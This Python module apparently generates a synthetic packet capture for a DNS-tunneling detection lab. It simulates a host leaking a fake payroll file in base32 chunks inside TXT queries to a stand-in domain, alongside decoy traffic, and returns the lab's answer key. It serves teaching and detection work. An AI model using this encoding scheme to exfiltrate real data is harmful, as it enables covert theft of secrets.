"""Lab 2 - data exfiltration through DNS tunneling.

Six workstations make ordinary DNS lookups through the LAN resolver for 10
minutes. One infected host smuggles a file out inside TXT queries to an
attacker-controlled domain: each query name is <seq>.<base32 data>.<domain>.
Decoys: one host looks up long CDN-style hostnames, another does a few
legitimate TXT (SPF/DMARC) lookups.
"""
import base64
import random
import struct
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
from .common import LAN_PREFIX, RESOLVER, eth, write_pcap

BASE_TIME = 1762300800
DURATION = 600
TUNNEL_DOMAIN = "metrics-sync.example"
CHUNK = 46
FILENAME = "payroll_q3.csv"

DOMAINS = ["www.news-daily.example", "cdn.photoshare.example", "mail.example.org",
           "shop.example.com", "video.streamhub.example", "docs.office-suite.example",
           "api.weather.example", "static.forum.example", "login.university.example",
           "maps.travel.example", "search.example.net", "updates.os-vendor.example",
           "chat.messenger.example", "music.tunes.example", "www.recipes.example",
           "git.devhub.example", "wiki.knowledge.example", "pay.bank.example",
           "tickets.events.example", "play.games.example"]


def _query(t, client, name, qtype, rng, answer=None):
    """A DNS query to the LAN resolver plus its response."""
    sport, qid = rng.randint(49152, 65000), rng.randint(0, 65535)
    q = eth(client, RESOLVER) / IP(src=client, dst=RESOLVER, id=rng.randint(1, 65000)) / \
        UDP(sport=sport, dport=53) / DNS(id=qid, rd=1, qd=DNSQR(qname=name, qtype=qtype))
    q.time = t
    if qtype == "A":
        an = DNSRR(rrname=name, type="A", ttl=300, rdata="198.51.100.%d" % rng.randint(10, 90))
    elif qtype == "AAAA":
        an = DNSRR(rrname=name, type="AAAA", ttl=300, rdata="2001:db8::%x" % rng.randint(1, 65000))
    else:
        an = DNSRR(rrname=name, type="TXT", ttl=60, rdata=answer or "v=spf1 -all")
    r = eth(RESOLVER, client) / IP(src=RESOLVER, dst=client, id=rng.randint(1, 65000)) / \
        UDP(sport=53, dport=sport) / DNS(id=qid, qr=1, rd=1, ra=1,
                                         qd=DNSQR(qname=name, qtype=qtype), an=an)
    r.time = t + rng.uniform(0.002, 0.03)
    return [q, r]


def _secret(rng):
    depts = ["ENG", "OPS", "FIN", "HR", "SALES", "IT"]
    lines = ["FILE:%s\n" % FILENAME, "id,dept,salary\n"]
    for i in range(1, 200):
        lines.append("E%04d,%s,%d\n" % (i, rng.choice(depts), rng.randrange(48, 190) * 1000))
    return "".join(lines).encode()


def generate(path, seed):
    rng = random.Random(seed * 100 + 2)
    clients = [LAN_PREFIX + str(n) for n in range(21, 27)]
    infected, cdn_host, mail_host = rng.sample(clients, 3)
    pkts = []

    for c in clients:  # ordinary lookups: A (usually followed by AAAA)
        t = BASE_TIME + rng.uniform(0, 4)
        while t < BASE_TIME + DURATION:
            name = rng.choice(DOMAINS)
            pkts += _query(t, c, name, "A", rng)
            if rng.random() < 0.7:
                pkts += _query(t + 0.001, c, name, "AAAA", rng)
            t += rng.expovariate(1 / 5.0)

    t = BASE_TIME + 5   # decoy 1: long CDN-style names, ordinary A queries
    while t < BASE_TIME + DURATION:
        name = "d%s.cdn.example.net" % "".join(rng.choice("0123456789abcdef") for _ in range(13))
        pkts += _query(t, cdn_host, name, "A", rng)
        t += rng.uniform(15, 40)

    for dom in ["example.org", "example.com", "mail.example.org"]:  # decoy 2: SPF/DMARC TXT
        for name in (dom, "_dmarc." + dom):
            pkts += _query(BASE_TIME + rng.uniform(20, 550), mail_host, name, "TXT", rng,
                           answer="v=spf1 include:_spf.mailhost.example -all")

    secret = _secret(rng)
    enc = base64.b32encode(secret).decode().rstrip("=").lower()
    chunks = [enc[i:i + CHUNK] for i in range(0, len(enc), CHUNK)]
    t = BASE_TIME + 60
    for seq, ch in enumerate(chunks):
        name = "%04x.%s.%s" % (seq, ch, TUNNEL_DOMAIN)
        ack = base64.b32encode(rng.randbytes(12)).decode().rstrip("=").lower()
        pkts += _query(t, infected, name, "TXT", rng, answer=ack)
        t += rng.uniform(0.3, 1.2)

    n = write_pcap(path, pkts)
    return {"infected_ip": infected, "cdn_host": cdn_host, "mail_host": mail_host,
            "domain": TUNNEL_DOMAIN, "n_tunnel_queries": len(chunks), "qtype": "TXT",
            "filename": FILENAME, "label_len": CHUNK, "secret_bytes": len(secret),
            "duration_s": DURATION, "packets": n}
